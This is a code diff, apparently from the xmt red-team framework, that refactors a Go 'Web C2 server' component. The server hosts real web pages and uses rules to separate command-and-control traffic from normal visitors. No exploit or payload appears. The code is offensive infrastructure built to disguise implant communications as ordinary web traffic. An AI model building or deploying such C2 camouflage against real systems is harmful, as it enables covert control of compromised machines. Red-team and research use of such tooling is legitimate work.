@@ -21,12 +21,12 @@ import (
 	"crypto/tls"
 	"net"
 	"net/http"
+	"net/http/cookiejar"
 	"os"
 	"sync/atomic"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/com"
-	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -37,16 +37,17 @@ import (
 // Use the Target Rules a URL mapping that can be used by clients to access the
 // C2 functions.
 type Server struct {
-	Target Target
+	Target  Target
+	Timeout time.Duration
 
-	ch      chan complete
-	tls     *tls.Config
-	dialer  *net.Dialer
+	t   transport
+	ch  chan complete
+	tls *tls.Config
+	//dialer  *net.Dialer
 	handler *http.ServeMux
-
-	Client *http.Client
-	rules  []Rule
-	done   uint32
+	client  *http.Client
+	rules   []Rule
+	done    uint32
 }
 type directory string
 
@@ -83,14 +84,23 @@ func (s *Server) Rule(r ...Rule) {
 	s.rules = append(s.rules, r...)
 }
 
-// New creates a new Web C2 server instance. This can be passed to the Listen
-// function of a controller to serve a Web Server that also acts as a C2 instance.
+// Client returns the internal 'http.Client' struct to allow for extra configuration.
+// To prevent any issues, it is recommended to NOT overrite or change the Transport
+// of this Client.
+//
+// The return value will ALWAYS be non-nil.
+func (s *Server) Client() *http.Client {
+	return s.client
+}
+
+// NewServer creates a new Web C2 server instance. This can be passed to the Listen
+// function of a 'c2.Server' to serve a Web Server that also acts as a C2 server.
 //
 // This struct supports all the default Golang http.Server functions and can be
 // used to serve real web pages. Rules must be defined using the 'Rule' function
 // to allow the server to differentiate between C2 and real traffic.
-func New(t time.Duration) *Server {
-	return NewTLS(t, nil)
+func NewServer(t time.Duration) *Server {
+	return NewServerTLS(t, nil)
 }
 
 // Serve attempts to serve the specified filesystem path 'f' at the URL mapped
@@ -109,6 +119,15 @@ func (s *Server) Serve(p, f string) error {
 	}
 	s.handler.Handle(p, http.FileServer(directory(f)))
 	return nil
+}
+
+// Transport returns the internal 'http.Transport' struct to allow for extra
+// configuration. To prevent any issues, it is recommended to NOT overrite or
+// change any of the 'Dial*' functions of this Transoport.
+//
+// The return value will ALWAYS be non-nil.
+func (s *Server) Transport() *http.Transport {
+	return s.t.Transport
 }
 
 // ServeFile attempts to serve the specified filesystem path 'f' at the URL mapped
@@ -147,47 +166,43 @@ func (s *Server) ServeDirectory(p, f string) error {
 	}
 	return xerr.Sub("not a directory", 0x36)
 }
+func (d directory) Open(_ string) (http.File, error) {
+	// 0 - READONLY
+	return os.OpenFile(string(d), 0, 0)
+}
 
-// NewTLS creates a new TLS wrapped Web C2 server instance. This can be passed
-// to the Listen function of a Controller to serve a Web Server that also acts
-// as a C2 instance. This struct supports all the default Golang http.Server
+// NewServerTLS creates a new TLS wrapped Web C2 server instance. This can be passed
+// to the Listen function of a 'c2.Server' to serve a Web Server that also acts
+// as a C2 server.
+//
+// This struct supports all the default Golang http.Server
 // functions and can be used to serve real web pages. Rules must be defined
 // using the 'Rule' function to allow the server to differentiate between C2
 // and real traffic.
-func NewTLS(t time.Duration, c *tls.Config) *Server {
-	w := &Server{
+func NewServerTLS(t time.Duration, c *tls.Config) *Server {
+	if t <= 0 {
+		t = com.DefaultTimeout
+	}
+	s := &Server{
 		ch:      make(chan complete, 1),
 		tls:     c,
-		dialer:  &net.Dialer{Timeout: t, KeepAlive: t},
 		handler: new(http.ServeMux),
-	}
-	w.Client = &http.Client{
 		Timeout: t,
-		Transport: &http.Transport{
-			Proxy:                 device.Proxy,
-			DialContext:           w.dialer.DialContext,
-			MaxIdleConns:          256,
-			IdleConnTimeout:       w.dialer.Timeout,
-			ForceAttemptHTTP2:     false,
-			TLSHandshakeTimeout:   w.dialer.Timeout,
-			ExpectContinueTimeout: w.dialer.Timeout,
-			ResponseHeaderTimeout: w.dialer.Timeout,
-			ReadBufferSize:        1,
-			WriteBufferSize:       1,
-			DisableKeepAlives:     true,
-		},
 	}
-	return w
+	var (
+		j, _ = cookiejar.New(nil)
+		x    = newTransport(t)
+	)
+	s.t.hook(x)
+	s.t.Transport = x
+	s.client = &http.Client{Jar: j, Transport: x}
+	return s
 }
 
 // Connect creates a C2 client connector that uses the same properties of the
 // Web struct parent.
 func (s *Server) Connect(x context.Context, a string) (net.Conn, error) {
-	return connect(x, &s.Target, s.Client, a)
-}
-func (d directory) Open(_ string) (http.File, error) {
-	// 0 - READONLY
-	return os.OpenFile(string(d), 0, 0)
+	return s.t.connect(x, &s.Target, s.client, a)
 }
 
 // Listen returns a new C2 listener for this Web instance. This function creates
@@ -211,13 +226,14 @@ func (s *Server) Listen(x context.Context, a string) (net.Listener, error) {
 		Server: &http.Server{
 			Addr:              a,
 			TLSConfig:         s.tls,
-			ReadTimeout:       s.dialer.Timeout,
+			ReadTimeout:       s.Timeout,
 			IdleTimeout:       0,
-			WriteTimeout:      s.dialer.Timeout,
-			ReadHeaderTimeout: s.dialer.Timeout,
+			WriteTimeout:      s.Timeout,
+			ReadHeaderTimeout: s.Timeout,
 		},
 	}
-	l.Handler, l.BaseContext = l, l.context
+	l.Handler = l
+	baseContext(l, l.context)
 	if copy(l.rules, s.rules); s.tls != nil {
 		if len(s.tls.NextProtos) == 0 {
 			s.tls.NextProtos = []string{"http/1.1"} // Prevent using http2 for websockets
